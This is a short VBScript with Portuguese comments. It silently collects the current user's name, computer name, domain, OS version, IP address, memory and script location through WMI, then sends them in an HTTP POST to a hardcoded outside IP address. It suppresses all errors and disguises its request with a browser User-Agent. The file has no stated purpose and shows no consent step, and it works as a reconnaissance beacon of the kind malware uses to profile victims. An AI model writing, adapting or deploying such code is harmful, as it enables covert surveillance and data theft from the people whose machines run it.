On Error Resume Next

Dim serverURL: serverURL = "http://100.26.23.21:3308/collect"

Set ws = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set net = CreateObject("WScript.Network")

' Coleta informações detalhadas
Dim info
info = "script_path=" & URLEncode(WScript.ScriptFullName) & _
       "&execution_dir=" & URLEncode(fso.GetParentFolderName(WScript.ScriptFullName)) & _
       "&username=" & URLEncode(net.UserName) & _
       "&computer_name=" & URLEncode(net.ComputerName) & _
       "&user_domain=" & URLEncode(net.UserDomain) & _
       "&os_version=" & URLEncode(GetOSInfo()) & _
       "&ip_address=" & URLEncode(GetIPAddress()) & _
       "&memory=" & URLEncode(GetMemoryInfo()) & _
       "&timestamp=" & URLEncode(Now())

' Envia os dados
SendPostData serverURL, info

Function GetOSInfo()
    Dim os, objWMIService
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set os = objWMIService.ExecQuery("SELECT * FROM Win32_OperatingSystem").ItemIndex(0)
    GetOSInfo = os.Caption & " | " & os.Version & " | " & os.OSArchitecture
End Function

Function GetMemoryInfo()
    Dim mem, objWMIService
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set mem = objWMIService.ExecQuery("SELECT * FROM Win32_ComputerSystem").ItemIndex(0)
    GetMemoryInfo = Round(mem.TotalPhysicalMemory / 1073741824, 1) & " GB RAM"
End Function

Function GetIPAddress()
    On Error Resume Next
    Dim objWMIService, colAdapters, objAdapter
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colAdapters = objWMIService.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
    
    For Each objAdapter in colAdapters
        If IsArray(objAdapter.IPAddress) And UBound(objAdapter.IPAddress) >= 0 Then
            GetIPAddress = objAdapter.IPAddress(0)
            Exit Function
        End If
    Next
    GetIPAddress = "Não detectado"
End Function

Sub SendPostData(url, data)
    Dim http
    Set http = CreateObject("MSXML2.XMLHTTP.6.0")
    http.Open "POST", url, False
    http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    http.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    http.Send data
    Set http = Nothing
End Sub

Function URLEncode(str)
    Dim i, char, result
    For i = 1 To Len(str)
        char = Mid(str, i, 1)
        If InStr("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_.~", char) > 0 Then
            result = result & char
        Else
            result = result & "%" & Hex(Asc(char))
        End If
    Next
    URLEncode = result
End Function

Set ws = Nothing
Set fso = Nothing
Set net = Nothing
